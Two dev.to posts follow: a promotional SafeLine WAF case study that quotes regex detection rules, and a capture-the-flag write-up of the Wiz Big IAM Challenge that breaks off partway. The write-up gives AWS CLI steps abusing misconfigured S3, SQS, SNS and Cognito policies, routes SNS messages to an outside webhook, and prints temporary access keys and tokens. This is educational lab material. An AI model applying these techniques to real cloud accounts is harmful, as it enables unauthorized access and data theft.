{"url": "https://dev.to/arina_cholee/how-safeline-waf-transformed-our-web-security-a-real-user-case-study-1m0l", "title": "How SafeLine WAF Transformed Our Web Security: A Real User Case Study", "content": "When our startup first began scaling our web service, cybersecurity was not our primary focus — until an incident made it painfully clear how vulnerable we were. Like most small teams, we initially relied on a\ntraditional WAF powered by ModSecurity\n, which is common across 80% of web applications worldwide. At first glance, it seemed to work: SQL injections were blocked, XSS attacks were detected, and the dashboard showed all green.\nBut very quickly, we ran into problems.\nThe Problems with Traditional WAFs\nHere’s what we experienced in real life:\nAttacks slipping through\n: Even though our WAF had rules like\nunion[\\w\\s]?select\nfor SQL injection and\n\\balert\\s\nfor XSS, attackers could easily bypass them with simple tricks. For example, inserting comments, using character encoding, or splitting keywords.\nFalse positives affecting real users\n: A harmless sentence like:\nThe union select members from each department to form a committee\nwould trigger an SQL injection alert, blocking legitimate traffic.\nLimited visibility and control\n: Regex-based WAFs could only see patterns, not intent. This made it nearly impossible to understand sophisticated attacks or protect against automated scraping and bot activity.\nIt became clear:\ntraditional regex-based WAFs were not enough for a growing web service like ours\n.\nDiscovering SafeLine WAF\nWe decided to try\nSafeLine WAF\n, and it completely changed how we approach web security. Unlike traditional WAFs, SafeLine doesn’t just rely on keyword patterns. It uses\nsyntax and semantic analysis\nto understand the\nmeaning behind user inputs\n, making it much more effective at detecting attacks while minimizing false positives.\nReal-World Workflow\nHere’s how SafeLine handled attacks in our environment:\nTraffic Parsing\n: SafeLine identifies all positions in HTTP requests that could contain user input.\nRecursive Decoding\n: Encoded parameters are fully decoded to their original form, revealing hidden attack payloads.\nSyntax Validation\n: Inputs are validated against SQL, JavaScript, and other language syntax rules — not just matching keywords.\nIntent Analysis\n: SafeLine evaluates whether the input is malicious or harmless.\nScoring & Blocking\n: Only confirmed attacks are blocked, reducing false positives and protecting legitimate users.\nWith this approach, attacks that bypassed our old WAF were immediately caught, including:\nSQL injections disguised with comments or encoding\nXSS attacks using unconventional payloads\nAutomated scraping bots trying to extract product information\nBrute-force login attempts and CC attacks\nKey Features We Benefited From\nWeb Attack Protection\n: SafeLine defends against SQL injection, XSS, code injection, OS command injection, path traversal, SSRF, XXE, CRLF injection, and more.\nAnti-Scraping & Anti-Scanning\n: Blocks scrapers, vulnerability scanners, worms, and other automated threats without impacting real users.\nDynamic Front-End Code Encryption\n: Each page load delivers a unique HTML/JS version, making reverse-engineering much harder.\nRate Limiting & CC Protection\n: Controls traffic from individual IPs, preventing brute-force attacks, traffic spikes, and DDoS attempts.\nHuman Verification & Identity Authentication\n: Differentiates between legitimate users and bots, and protects sensitive areas with optional login authentication.\nDetailed Analytics\n: Provides deep insight into attack patterns, blocked traffic, and security performance.\nSeeing SafeLine in Action\nOne moment that stands out: a bot was scraping our product catalog at an alarming rate. With our old WAF, we wouldn’t have noticed until significant data was compromised. SafeLine detected and mitigated it in\nreal-time\n, without affecting genuine users.\nAnother benefit was handling SQL injection attempts. Before, encoded payloads would slip through unnoticed. SafeLine analyzed the SQL syntax and intent, blocking attacks without falsely flagging legitimate queries.\nThe difference in user experience was noticeable:\nlegitimate visitors no longer faced random blocks or slowdowns\n, and our team gained confidence that sensitive data and critical functionality were protected.\nPerformance Metrics\nWe also benchmarked SafeLine against our previous WAF and Cloudflare:\nMetric\nModSecurity\nCloudflare\nSafeLine (Balanced)\nSafeLine (Strict)\nSample Size\n33,669\n33,669\n33,669\n33,669\nDetection Rate\n69.74%\n10.70%\n71.65%\n76.17%\nFalse Positive Rate\n17.58%\n0.07%\n0.07%\n0.22%\nAccuracy Rate\n82.20%\n98.40%\n99.45%\n99.38%\nSafeLine\ndetects more attacks and drastically reduces false positives\n, keeping real users safe while stopping malicious traffic.\nWhy Semantic Analysis Matters\nProgramming languages used in web traffic —\nSQL, HTML, JavaScript\n— are\nType 2 grammars\n. Regex, used in most traditional WAFs, is\nType 3\n, which is far less expressive. This fundamental difference means regex cannot fully understand structure or intent, making attacks easier to bypass.\nSafeLine’s\nsyntax and semantic analysis\nallows it to understand\nwhat the traffic is actually doing\n, not just whether it matches a pattern. That’s why attacks that slip past traditional WAFs fail against SafeLine.\nFor startups, SMEs, or even larger web services that want\nrobust security without disrupting real users\n, SafeLine WAF is a game-changer. Its combination of\nsemantic analysis, bot protection, dynamic code encryption, CC mitigation, and authentication tools\ngives your team\nvisibility, control, and reliable protection\n.\nOfficial Website:\nSafeLine\nLive Demo:\nTry It Yourself\nGitHub Repository:\nSafeLine WAF", "source": "devto", "crawled_at": "2025-11-27T18:22:10.481891", "metadata": {"tags": ["websecurity", "cybersecurity", "waf", "safeline"], "published": "2025-11-27T08:49:02Z", "author": "arina_cholee"}}
{"url": "https://dev.to/aws-builders/solving-the-big-iam-challenge-39ho", "title": "Solving The Big IAM Challenge", "content": "CTF (Capture The Flag) challenges are a fun and safe way to stretch a stale brain muscle and learn a trick or two about how robust security is not actually that robust. Today we're going to solve\nThe Big IAM Challenge\n1\nand reflect on the lessons learned.\nTable of Contents\nTable of Contents\nIntro\nChallenge 1: Buckets of Fun\nChallenge 2:\nGoogle\nAnalytics\nChallnge 3: Enable Push Notifications\nChallenge 4: Admin only?\nChallenge 5: Do I know you?\nChallenge 6: One final push\nPost Mortem\nIntro\nThe Big IAM Challenge consists of six challenges, each based on a task and an IAM policy. We also have access to a web CLI. With these tools, we will have to find our way to a flag -- a string containing the key that will allow us to progress to the next challenge and, eventually, solve them all.\nChallenge 1: Buckets of Fun\nTask\nWe all know that public buckets are risky. But can you find the flag?\n#\nIAM\npolicy\n{\n\"Version\"\n:\n\"2012-10-17\"\n,\n\"Statement\"\n:\n[\n{\n\"Effect\"\n:\n\"Allow\"\n,\n\"Principal\"\n:\n\"*\"\n,\n\"Action\"\n:\n\"s3:GetObject\"\n,\n\"Resource\"\n:\n\"arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*\"\n},\n{\n\"Effect\"\n:\n\"Allow\"\n,\n\"Principal\"\n:\n\"*\"\n,\n\"Action\"\n:\n\"s3:ListBucket\"\n,\n\"Resource\"\n:\n\"arn:aws:s3:::thebigiamchallenge-storage-9979f4b\"\n,\n\"Condition\"\n:\n{\n\"StringLike\"\n:\n{\n\"s3:prefix\"\n:\n\"files/*\"\n}\n}\n}\n]\n}\nEnter fullscreen mode\nExit fullscreen mode\nFrom the existing policy, we can conclude that we have access to a certain bucket. We can retrieve all the objects from this bucket but can only list the contents of the\nfiles/\ndirectory within it. Let's do that.\n>\naws s3\nls\nthebigiamchallenge-storage-9979f4b/files/\n2023-06-05 19:13:53         37 flag1.txt\n2023-06-08 19:18:24      81889 logo.png\nEnter fullscreen mode\nExit fullscreen mode\nAnd there’s our flag. If we try to download it, we’ll encounter an error indicating that the filesystem is read-only -- which makes sense, but poses an obstacle for us. However, we can overcome this issue by copying the file to stdin and printing it to the console:\n>\naws s3\ncp\ns3://thebigiamchallenge-storage-9979f4b/files/flag1.txt - |\ncat\n{\nwiz:exposed-storage-risky-as-usual\n}\nEnter fullscreen mode\nExit fullscreen mode\nWith this flag, Challenge 1 is complete.\nChallenge 2:\nGoogle\nAnalytics\nTask\nWe created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?\nJoin our queue and get the secret flag.\n#\nIAM\npolicy\n{\n\"Version\"\n:\n\"2012-10-17\"\n,\n\"Statement\"\n:\n[\n{\n\"Effect\"\n:\n\"Allow\"\n,\n\"Principal\"\n:\n\"*\"\n,\n\"Action\"\n:\n[\n\"sqs:SendMessage\"\n,\n\"sqs:ReceiveMessage\"\n],\n\"Resource\"\n:\n\"arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2\"\n}\n]\n}\nEnter fullscreen mode\nExit fullscreen mode\nThis is the kind of task I can stand behind -- abandon Google's privacywashing, their lust for private data, and their obsession with maximizing profits.\nFrom this policy, we can conclude that we're meant to receive a message from the queue. Let's use\nawscli\nfor that purpose.\n>\naws sqs receive-message\n\naws: error: the following arguments are required:\n--queue-url\nEnter fullscreen mode\nExit fullscreen mode\nTo read a message from the queue, we need a queue URL, but we only have an ARN. That’s not a problem -- we can construct one ourselves. Queue URLs follow this format:\nhttps://sqs.{region}.amazonaws.com/{account}/{queue_name}\n.\n>\naws sqs receive-message\n--queue-url\nhttps://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2\n{\n\"Messages\"\n:\n[\n{\n...\n\"Body\"\n:\n\"{\n\\\"\nURL\n\\\"\n:\n\\\"\nhttps://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\n\\\"\n,\n\\\"\nUser-Agent\n\\\"\n:\n\\\"\nLynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\n\\\"\n,\n\\\"\nIsAdmin\n\\\"\n: true}\"\n}\n]\n}\nEnter fullscreen mode\nExit fullscreen mode\nNo flag here, but we do have a URL pointing to a file in a bucket. Let’s check out that file.\n>\ncurl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\n{\nwiz:you-are-at-the-front-of-the-queue\n}\nEnter fullscreen mode\nExit fullscreen mode\nBingo! There’s our flag and another completed challenge.\nChallnge 3: Enable Push Notifications\nTask\nWe got a message for you. Can you get it?\n#\nIAM\npolicy\n{\n\"Version\"\n:\n\"2008-10-17\"\n,\n\"Id\"\n:\n\"Statement1\"\n,\n\"Statement\"\n:\n[\n{\n\"Sid\"\n:\n\"Statement1\"\n,\n\"Effect\"\n:\n\"Allow\"\n,\n\"Principal\"\n:\n{\n\"AWS\"\n:\n\"*\"\n},\n\"Action\"\n:\n\"SNS:Subscribe\"\n,\n\"Resource\"\n:\n\"arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications\"\n,\n\"Condition\"\n:\n{\n\"StringLike\"\n:\n{\n\"sns:Endpoint\"\n:\n\"*@tbic.wiz.io\"\n}\n}\n}\n]\n}\nEnter fullscreen mode\nExit fullscreen mode\nThe policy clearly wants us to subscribe to this SNS topic. I’d be happy to oblige! Since we have a wildcard (\n*\n) before\n@tbic.wiz.io\n, it means we can use any email!\n>\naws sns subscribe\n--topic-arn\narn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications\n--protocol\nemail\n--notification-endpoint\nhello@tbic.wiz.io\n{\n\"SubscriptionArn\"\n:\n\"pending confirmation\"\n}\nEnter fullscreen mode\nExit fullscreen mode\nAnd now we wait.\nWait, what? Wait for what? How do I confirm the subscription to the topic if I have no access to the email? Looks like I fell into the easiest trap!\nOkay, let’s think. Since we don’t have access to email, we need to figure out another way to receive a message from the topic. How can we do that? What are the options to receive messages from SNS? We can use the following protocols to communicate with SNS: HTTP, HTTPS, email, email-json, SMS, SQS, application, Lambda, and Firehose. What if we set up an HTTP endpoint to receive messages? Webhooks, here we go! Luckily, there are\nservices\nonline that allow us to test webhook requests. The trick here is to take the unique webhook URL and add the required endpoint string to the end of the URL:\nhttps://webhook.site/3bddcb48-f58d-4284-a731-491c8784e0b1/@tbic.wiz.io\n. Still a valid URL? Let’s find out!\n>\naws sns subscribe\n--topic-arn\narn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications\n--protocol\nhttps\n--notification-endpoint\nhttps://webhook.site/3bddcb48-f58d-4284-a731-491c8784e0b1/@tbic.wiz.io\n{\n\"SubscriptionArn\"\n:\n\"pending confirmation\"\n}\nEnter fullscreen mode\nExit fullscreen mode\nIn a couple of seconds, we receive a message with the configuration URL. Copy and paste it into the browser to confirm the subscription. After several more seconds, we see a new message in the webhook site interface with the flag itself!\n{\n...\n\"Message\"\n:\n\"{wiz:always-suspect-asterisks}\"\n,\n...\n}\nEnter fullscreen mode\nExit fullscreen mode\nThird challenge is done -- way to go!\nChallenge 4: Admin only?\nTask\nWe learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?\n#\nIAM\npolicy\n{\n\"Version\"\n:\n\"2012-10-17\"\n,\n\"Statement\"\n:\n[\n{\n\"Effect\"\n:\n\"Allow\"\n,\n\"Principal\"\n:\n\"*\"\n,\n\"Action\"\n:\n\"s3:GetObject\"\n,\n\"Resource\"\n:\n\"arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*\"\n},\n{\n\"Effect\"\n:\n\"Allow\"\n,\n\"Principal\"\n:\n\"*\"\n,\n\"Action\"\n:\n\"s3:ListBucket\"\n,\n\"Resource\"\n:\n\"arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321\"\n,\n\"Condition\"\n:\n{\n\"StringLike\"\n:\n{\n\"s3:prefix\"\n:\n\"files/*\"\n},\n\"ForAllValues:StringLike\"\n:\n{\n\"aws:PrincipalArn\"\n:\n\"arn:aws:iam::133713371337:user/admin\"\n}\n}\n}\n]\n}\nEnter fullscreen mode\nExit fullscreen mode\nThe provided IAM policy clearly states that listing files in a bucket is only allowed for a user with the\nadmin\nrole. However, there's also a loophole: anyone can download files from the bucket. This is a very bad practice and a huge security risk. From these statements, we can conclude that the bucket has at least a\nfiles/\ndirectory, and we can view it by accessing the HTTP endpoint of the bucket.\n>\ncurl\n\"https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/\"\n<?xml\nversion\n=\n\"1.0\"\nencoding\n=\n\"UTF-8\"\n?>\n<ListBucketResult\nxmlns\n=\n\"http://s3.amazonaws.com/doc/2006-03-01/\"\n>\n<Name>thebigiamchallenge-admin-storage-abf1321</Name><Prefix>files/</Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>files/flag-as-admin.txt</Key><LastModified>2023-06-07T19:15:43.000Z</LastModified><ETag>\n\"e365cfa7365164c05d7a9c209c4d8514\"\n</ETag><Size>42</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>files/logo-admin.png</Key><LastModified>2023-06-08T19:20:01.000Z</LastModified><ETag>\n\"c57e95e6d6c138818bf38daac6216356\"\n</ETag><Size>81889</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>\nEnter fullscreen mode\nExit fullscreen mode\nHe-he, there it is. Here are the droids I’m looking for!\n>\naws s3\ncp\ns3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - |\ncat\n{\nwiz:principal-arn-is-not-what-you-think\n}\nEnter fullscreen mode\nExit fullscreen mode\nChallenge 4 is complete.\nChallenge 5: Do I know you?\nTask\nWe configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.\n#\nIAM\npolicy\n{\n\"Version\"\n:\n\"2012-10-17\"\n,\n\"Statement\"\n:\n[\n{\n\"Sid\"\n:\n\"VisualEditor0\"\n,\n\"Effect\"\n:\n\"Allow\"\n,\n\"Action\"\n:\n[\n\"mobileanalytics:PutEvents\"\n,\n\"cognito-sync:*\"\n],\n\"Resource\"\n:\n\"*\"\n},\n{\n\"Sid\"\n:\n\"VisualEditor1\"\n,\n\"Effect\"\n:\n\"Allow\"\n,\n\"Action\"\n:\n[\n\"s3:GetObject\"\n,\n\"s3:ListBucket\"\n],\n\"Resource\"\n:\n[\n\"arn:aws:s3:::wiz-privatefiles\"\n,\n\"arn:aws:s3:::wiz-privatefiles/*\"\n]\n}\n]\n}\nEnter fullscreen mode\nExit fullscreen mode\nOkay, let’s dissect what we have here. First things first,\ncognito-sync:*\nis our way to the contents of the bucket mentioned in the second statement of the policy. I feel like\nmobileanalytics:PutEvents\nis a bit misleading here and may not prove useful, but we’ll see. There’s also a picture of AWS Cognito in this task, which is unusual. Perhaps it’s also a clue? Let’s inspect the code.\n<img\nstyle=\n\"width: 16rem\"\nid=\n\"signedImg\"\nclass=\n\"mx-auto mt-4\"\nsrc=\n\"#\"\nalt=\n\"Signed img from S3\"\n/>\n<script\nsrc=\n\"https://sdk.amazonaws.com/js/aws-sdk-2.719.0.min.js\"\n></script>\n<script>\nAWS\n.\nconfig\n.\nregion\n=\n'\nus-east-1\n'\n;\nAWS\n.\nconfig\n.\ncredentials\n=\nnew\nAWS\n.\nCognitoIdentityCredentials\n({\nIdentityPoolId\n:\n\"\nus-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b\n\"\n});\n// Set the region\nAWS\n.\nconfig\n.\nupdate\n({\nregion\n:\n'\nus-east-1\n'\n});\n$\n(\ndocument\n).\nready\n(\nfunction\n()\n{\nvar\ns3\n=\nnew\nAWS\n.\nS3\n();\nparams\n=\n{\nBucket\n:\n'\nwiz-privatefiles\n'\n,\nKey\n:\n'\ncognito1.png\n'\n,\nExpires\n:\n60\n*\n60\n}\nsignedUrl\n=\ns3\n.\ngetSignedUrl\n(\n'\ngetObject\n'\n,\nparams\n,\nfunction\n(\nerr\n,\nurl\n)\n{\n$\n(\n'\n#signedImg\n'\n).\nattr\n(\n'\nsrc\n'\n,\nurl\n);\n});\n});\n</script>\nEnter fullscreen mode\nExit fullscreen mode\nYep, there it is -- a very helpfully placed Cognito Identity Pool ID. Let’s use it to obtain our ID:\n>\naws cognito-identity get-id\n--identity-pool-id\nus-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b\n{\n\"IdentityId\"\n:\n\"us-east-1:157d6171-eee2-cf0f-f29f-f684025c7f2c\"\n}\nEnter fullscreen mode\nExit fullscreen mode\nAnd with this ID, we are able to obtain credentials to assume!\n>\naws cognito-identity get-credentials-for-identity\n--identity-id\nus-east-1:157d6171-eee2-cf0f-f29f-f684025c7f2c\n{\n\"IdentityId\"\n:\n\"us-east-1:157d6171-eee2-cf0f-f29f-f684025c7f2c\"\n,\n\"Credentials\"\n:\n{\n\"AccessKeyId\"\n:\n\"ASIARK7LBOHXHAHYXG4C\"\n,\n\"SecretKey\"\n:\n\"i1sxDh5obFEGzMpIw3s+nGgPfnuD3vdDjlqhMakW\"\n,\n\"SessionToken\"\n:\n\"IQoJb3JpZ2luX2VjEPz//////////wEaCXVzLWVhc3QtMSJGMEQCIE086qWoZ18m8+iEw11NGcawCIbwmxfXZXjaZbYNgBaRAiB3OJLgI1X5v72NTDiOfcwDnZOMGwNO2ZtMte9Ff1fSIiq7BQil//\n////////8BEAAaDDA5MjI5Nzg1MTM3NCIMq3db2mZPg5GWhCfGKo8F8o8rTZPXKSTgtByx2JcB93zlqEEJw2zWzF61O6App4FMY8Jrhh9YAbTDR4meOt32FOnPiDKEG5Tko6rmeRwunwxFVXtEIrg1TVhaTLVuyViePLOXJYnrwIpRN7U1WlQSYIx3lRuXIEG5Gm48H51iaz+YBhcYO8CHpidqQBnBAyoMmFaZK/liuokGjufsmj9Rc6/kInC/F+gat7fyycHICZbYHzYgpSagP44NVNqTlMqW8dWZeBN04X05MEHxeZuP7LNNmEIuiCEBFTyxtDQTweK5nfySFXJUK8EWjdehgGzP3lPZIdbRadXrXVjgSbRK9CZtYIiCoKsiIhyJ+pGoY+U41y03nHbQVsAGyadEMWqxyO48ij5aCsl9Q8Sn8VPmzUGYb02WqT8TpMmPmGpxzb1SrMXpBcI9yfmT0afS7HeGIcbtrNdGx+pPZEBEfwAutGFjgRm2IgkH5pCwfWQT1/9vlAGeYSxPg+4vHyd/e/lSRptaGSlVqBZR+ayMUTxDYnCu8PR3BNHhf+RHs2GNCc8V5e+rFpmy2dpoFAaW90OMJn56V0m41FtU1UGqB26Ma8eWKgvtokHAK6OIxyZqvN7u24NKkp9u7EvZ44VX1ztU4eHNNK/fpoVWzeS48t9XImM6ImebAMVV/9HOyYVSRUoV5+vsLlAbYt2yDW82DPAd6wOELBez9XsP3NDwK4gPA13SX/7lx0MqsToWihcVXpPE891wVwouyAQj4oJy2QzocD88saqcJLnlDmUJeXsROAdDdpOl0RyG73xmxjOeycF2ebBfccaMW9sfbCj+v9vwQXlccB+Y1E6yy7rv4m5WVqZZiWkR69sk6ugyONSP5UAHdcwT+lUIudYibF5PcDCW8vzABjrdAkXktLCIeiuItjYDiKf93U9aSD9E539EfMuyaNIkL838BFEwYQneudtHjWUZ3MNZNNr7gTVmkZpjP5tvYkzYP42FLkdP0lU4uhnY7+wb1X1MhLz5g2Ff0HM1vQi+s63a1ow5zb+njOoZ2NDcMM3qpn4u8tyHK1Sw1IJPYLGLfk7OtkI3wVl3rhUIeObVMDWC7Q72xaqeSkPnjqAwXGmVVpxhmqha5FC4XInhwOUtPMhL5iFla6ZLA1lD1edv/ZD9ger1dppUUK7wXonpX+pIhv9IXWIt0JSzQRaju9Cy4Ou6m6Fs4LqHyk/cnGZb+4lslVgPotKf5LeHqKMMO0UOCvtw7KQoGlg7EDwTUMhy8uIwsCMZXTnJNoPaN526s10V6OlwYLc3MBO97dZbfmvZ4juFsgNdDrbCbNHVWHxUyms+elD/KvbrM47aXX2r1IGPexDvtmSwqwCBvVv7WPw=\"\n,\n\"Expiration\"\n: 1746880294.0\n}\n}\nEnter fullscreen mode\nExit fullscreen mode\nI can't help but enjoy this amazing loophole left for us to find. Damn, I love these challenges.\nWith the help of the provided credentials, we will be able to assume a role. However, we won't be able to do that in the web CLI on the challenge page -- we'll have to use our own terminal.\n$\nexport\nAWS_ACCESS_KEY_ID\n=\nASIARK7LBOHXHAHYXG4C\n$\nexport\nAWS_SECRET_ACCESS_KEY\n=\ni1sxDh5obFEGzMpIw3s+nGgPfnuD3vdDjlqhMakW\n$\nexport\nAWS_SESSION_TOKEN\n=\nIQoJb3JpZ2luX2VjEPz//////////wEaCXVzLWVhc3QtMSJGMEQCIE086qWoZ18m8+iEw11NGcawCIbwmxfXZXjaZbYNgBaRAiB3OJLgI1X5v72NTDiOfcwDnZOMGwNO2ZtMte9Ff1fSIiq7BQil//////////8BEAAaDDA5MjI5Nzg1MTM3NCIMq3db2mZPg5GWhCfGKo8F8o8rTZPXKSTgtByx2JcB93zlqEEJw2zWzF61O6App4FMY8Jrhh9YAbTDR4meOt32FOnPiDKEG5Tko6rmeRwunwxFVXtEIrg1TVhaTLVuyViePLOXJYnrwIpRN7U1WlQSYIx3lRuXIEG5Gm48H51iaz+YBhcYO8CHpidqQBnBAyoMmFaZK/liuokGjufsmj9Rc6/kInC/F+gat7fyycHICZbYHzYgpSagP44NVNqTlMqW8dWZeBN04X05MEHxeZuP7LNNmEIuiCEBFTyxtDQTweK5nfySFXJUK8EWjdehgGzP3lPZIdbRadXrXVjgSbRK9CZtYIiCoKsiIhyJ+pGoY+U41y03nHbQVsAGyadEMWqxyO48ij5aCsl9Q8Sn8VPmzUGYb02WqT8TpMmPmGpxzb1SrMXpBcI9yfmT0afS7HeGIcbtrNdGx+pPZEBEfwAutGFjgRm2IgkH5pCwfWQT1/9vlAGeYSxPg+4vHyd/e/lSRptaGSlVqBZR+ayMUTxDYnCu8PR3BNHhf+RHs2GNCc8V5e+rFpmy2dpoFAaW90OMJn56V0m41FtU1UGqB26Ma8eWKgvtokHAK6OIxyZqvN7u24NKkp9u7EvZ44VX1ztU4eHNNK/fpoVWzeS48t9XImM6ImebAMVV/9HOyYVSRUoV5+vsLlAbYt2yDW82DPAd6wOELBez9XsP3NDwK4gPA13SX/7lx0MqsToWihcVXpPE891wVwouyAQj4oJy2QzocD88saqcJLnlDmUJeXsROAdDdpOl0RyG73xmxjOeycF2ebBfccaMW9sfbCj+v9vwQXlccB+Y1E6yy7rv4m5WVqZZiWkR69sk6ugyONSP5UAHdcwT+lUIudYibF5PcDCW8vzABjrdAkXktLCIeiuItjYDiKf93U9aSD9E539EfMuyaNIkL838BFEwYQneudtHjWUZ3MNZNNr7gTVmkZpjP5tvYkzYP42FLkdP0lU4uhnY7+wb1X1MhLz5g2Ff0HM1vQi+s63a1ow5zb+njOoZ2NDcMM3qpn4u8tyHK1Sw1IJPYLGLfk7OtkI3wVl3rhUIeObVMDWC7Q72xaqeSkPnjqAwXGmVVpxhmqha5FC4XInhwOUtPMhL5iFla6ZLA1lD1edv/ZD9ger1dppUUK7wXonpX+pIhv9IXWIt0JSzQRaju9Cy4Ou6m6Fs4LqHyk/cnGZb+4lslVgPotKf5LeHqKMMO0UOCvtw7KQoGlg7EDwTUMhy8uIwsCMZXTnJNoPaN526s10V6OlwYLc3MBO97dZbfmvZ4juFsgNdDrbCbNHVWHxUyms+elD/KvbrM47aXX2r1IGPexDvtmSwqwCBvVv7WPw\n=\n$\naws sts get-caller-identity\n{\n\"UserId\"\n:\n\"AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials\"\n,\n\"Account\"\n:\n\"092297851374\"\n,\n\"Arn\"\n:\n\"arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials\"\n}\n$\naws s3\nls\ns3://wiz-privatefiles/\n2023-06-05 21:42:27       4220 cognito1.png\n2023-06-05 15:28:35         37 flag1.txt\n$\naws s3\ncp\ns3://wiz-privatefiles/flag1.txt - |\ncat\n{\nwiz:incognito-is-always-suspicious\n}\nEnter fullscreen mode\nExit fullscreen mode\nOh boy, I couldn’t agree more. A very fun and very interesting challenge done. Let’s finish the final one!\nChallenge 6: One final push\nTask\nAnonymous access no more. Let's see what can you do now.\nNow try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role\n#\nIAM\npolicy\n{\n\"Version\"\n:\n\"2012-10-17\"\n,\n\"Statement\"\n:\n[\n{\n\"Effect\"\n:\n\"Allow\"\n,\n\"Principal\"\n:\n{\n\"Federated\"\n:\n\"cognito-identity.amazonaws.com\"\n},\n\"Action\"\n:\n\"sts:AssumeRoleWithWebIdentity\"\n,\n\"Condition\"\n:\n{\n\"StringEquals\"\n:\n{\n\"cognito-identity.amazonaws.com:aud\"\n:\n\"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b\"\n}\n}\n}\n]\n}\nEnter fullscreen mode\nExit fullscreen mode\nThe provided AWS policy is like telling us: \"Hey, there's a quite specific action that you can use!\" And use it, we will. Same as before, using the Identity Pool ID, we will obtain our Identity ID.\n>\naws cognito-identity get-id\n--identity-pool-id\nus-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b\n{\n\"IdentityId\"\n:\n\"us-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8\"\n}\nEnter fullscreen mode\nExit fullscreen mode\nWith the Identity ID, we are now able to get an OpenID token, since we can't just assume any role with STS and need to use web identity. Hence, OpenID token.\n>\naws cognito-identity get-open-id-token\n--identity-id\nus-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8\n{\n\"IdentityId\"\n:\n\"us-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8\"\n,\n\"Token\"\n:\n\"eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWVhNi1jMGRhLTE0YmQtMTFjMTI2NzhjMWE4IiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDY4Nzg0NTksImlhdCI6MTc0Njg3Nzg1OX0.jLAQFCKrh5uYs-FO89P8LTmHsNRaySNWAhCDNE4N5PxSUu3AuduCbuYUVXrCcvflUPhJvePb2cTk2cM1K431ZtKqP1gWJ8XL0BW6M_JO2jHXftuWnTHeqvDuca36uTAOMJ5Vk62Fm_2OSgeWoLGgqT4WolhuRZa4nn0evuKtuHK1omEKnPsymKhUsqHw45mCdZ177XT5QCry2eiOielY3niTt7x137j_E739eP6x0tbXFMgpHTvxKFIkaQOhBn0A-1tDjZ5WlQeT5qbioOaAVK5xAjAfJeQOpZ8AZPr-H0aC9OCCN-_zNGgil31DAzFTWhAtjYevvdN9RkaIsW_PdQ\"\n}\nEnter fullscreen mode\nExit fullscreen mode\nAnd now, with this nice JWT (JSON Web Token), we would be able to assume the role the challenge is telling us to assume.\n$\naws sts assume-role-with-web-identity\n--web-identity-token\neyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWVhNi1jMGRhLTE0YmQtMTFjMTI2NzhjMWE4IiwiYXVkIjoidXMtZWFzdC0xOmI3M\n2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDY4Nzg0NTksImlhdCI6MTc0Njg3Nzg1OX0.jLAQFCKrh5uYs-FO89P8LTmHsNRaySNWAhCDNE4N5PxSUu3A\nuduCbuYUVXrCcvflUPhJvePb2cTk2cM1K431ZtKqP1gWJ8XL0BW6M_JO2jHXftuWnTHeqvDuca36uTAOMJ5Vk62Fm_2OSgeWoLGgqT4WolhuRZa4nn0evuKtuHK1omEKnPsymKhUsqHw45mCdZ177XT5QCry2eiOielY3niTt7x137j_E739eP6x0tbXFMgpHTvxKFIkaQOhBn0A-1tDjZ5WlQeT5qbioOaAVK5xAjAfJeQ\nOpZ8AZPr-H0aC9OCCN-_zNGgil31DAzFTWhAtjYevvdN9RkaIsW_PdQ\n--role-arn\narn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role\n--role-session-name\nHelloThere\n{\n\"Credentials\"\n:\n{\n\"AccessKeyId\"\n:\n\"ASIARK7LBOHXPDT2U3BW\"\n,\n\"SecretAccessKey\"\n:\n\"CiOKsQIiMBxy3Hav5bQ230c13pycH6vrqmcVp14s\"\n,\n\"SessionToken\"\n:\n\"Fw